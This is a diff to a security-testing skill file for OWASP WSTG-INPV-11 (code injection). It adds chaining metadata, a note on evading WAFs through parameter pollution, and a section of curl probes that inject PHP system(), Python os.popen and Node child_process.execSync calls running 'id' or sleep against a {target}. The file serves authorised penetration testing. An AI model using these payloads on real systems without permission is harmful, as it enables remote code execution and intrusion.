@@ -8,9 +8,10 @@ author: cyberstrike-official
 tags: [injection, input-validation, xss, sqli, wstg, inpv]
 tech_stack: [python, ruby, php, java, jinja2, twig, freemarker]
 cwe_ids: [CWE-94, CWE-95]
-chains_with: []
-prerequisites: []
-severity_boost: {}
+chains_with: [wstg-inpv-04, wstg-inpv-01]
+prerequisites: [wstg-conf-01, wstg-conf-02]
+severity_boost:
+  wstg-inpv-04: "HTTP Parameter Pollution splits the payload across duplicate parameters to evade signature-based WAF/input filters, smuggling a Code Injection payload past validation = Critical (Remote Code Execution)"
 ---
 
 # wstg-inpv-11
@@ -372,6 +373,31 @@ this.constructor.constructor("return process")().mainModule.require("child_proce
 
 ---
 
+## Example Commands/Payloads
+
+```bash
+# PHP eval() probe
+curl -s "https://{target}/page.php?code=system('id')"
+
+# Python eval() probe
+curl -s "https://{target}/api/calc?expr=__import__('os').popen('id').read()"
+
+# Node.js probe
+curl -s "https://{target}/api/eval?code=require('child_process').execSync('id')"
+
+# Time-based confirmation (~5s delay indicates execution)
+time curl -s "https://{target}/page.php?code=sleep(5)"
+```
+
+| Payload | Language | Detection Pattern |
+| --- | --- | --- |
+| `system('id')` / `` `id` `` | PHP | `uid=` in response |
+| `__import__('os').popen('id').read()` | Python | `uid=` in response |
+| `require('child_process').execSync('id')` | Node.js | `uid=` in response |
+| `sleep(5)` / `__import__('time').sleep(5)` | Any (blind) | Response delayed ~5s vs baseline |
+
+---
+
 ## Remediation
 
 ```python
@@ -441,6 +467,13 @@ const result = vm.run(userInput)
 | ---------- | -------------------------------------- |
 | **CWE-94** | Improper Control of Generation of Code |
 
+
+---
+
+## References
+
+- [OWASP WSTG - WSTG-INPV-11: Testing for Code Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection)
+- [PayloadsAllTheThings - Server Side Template Injection / Code Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 ---
 
